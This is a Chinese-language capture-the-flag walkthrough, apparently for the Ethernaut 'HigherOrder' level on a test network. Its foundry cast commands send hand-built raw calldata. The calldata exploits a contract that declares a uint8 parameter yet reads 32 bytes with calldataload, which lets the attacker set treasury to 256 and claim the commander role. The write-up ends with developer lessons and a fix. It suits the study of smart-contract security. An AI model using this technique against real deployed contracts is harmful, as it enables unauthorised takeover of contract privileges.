# 31-HigherOrder
```
# 1. 查看初始状态
export HigherOrder_ADDRESS=0x2Aee34a7268Fb1055f4581Bb74AabB1ED9e92814
cast call $HigherOrder_ADDRESS "treasury()(uint256)" --rpc-url $sepolia_rpc
# 输出: 0
cast call $HigherOrder_ADDRESS "commander()(address)" --rpc-url $sepolia_rpc
# 输出: 0x0000000000000000000000000000000000000000

# 2. 获取函数选择器
cast sig "registerTreasury(uint8)"
# 输出: 0x211c85ab

# 3. 构造原始 calldata 绕过 uint8 限制
# calldata = 0x211c85ab (函数选择器) + 0x0000...0100 (256的uint256编码)
cast send $HigherOrder_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    "0x211c85ab0000000000000000000000000000000000000000000000000000000000000100"

# 4. 验证 treasury 值
cast call $HigherOrder_ADDRESS "treasury()(uint256)" --rpc-url $sepolia_rpc
# 输出: 256 ✓

# 5. 成为 commander
cast send $HigherOrder_ADDRESS "claimLeadership()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 6. 验证成功
cast call $HigherOrder_ADDRESS "commander()(address)" --rpc-url $sepolia_rpc
# 输出: 你的地址 ✓

# 攻击原理
函数签名: registerTreasury(uint8)  ← ABI 期望 1 字节
内部实现: sstore(treasury_slot, calldataload(4))  ← 读取 32 字节！

正常调用 registerTreasury(255):
  calldata: 0x211c85ab + 0x00...ff (cast 会截断为 uint8)
  
攻击调用（原始 calldata）:
  calldata: 0x211c85ab + 0x00...0100 (256)
  ├─ ABI 解码器期望 uint8，但我们绕过它
  └─ calldataload(4) 直接读取完整 32 字节 = 256 ✓
```

### 考察点
- **类型安全绕过**：函数签名声明 `uint8`，但 assembly 直接读取 32 字节
- **ABI 编码理解**：ABI 会将所有基本类型编码为 32 字节，即使声明为 uint8
- **Calldata 直接操作**：使用 `calldataload(4)` 绕过 Solidity 的类型检查
- **原始交易构造**：通过 `cast send` 发送原始 calldata 绕过客户端验证
- **教训**：
  - 不要混用高级类型声明和低级 assembly 读取
  - Assembly 中应该验证参数范围
  - 正确做法：`let value := and(calldataload(4), 0xff)` 截断为 uint8
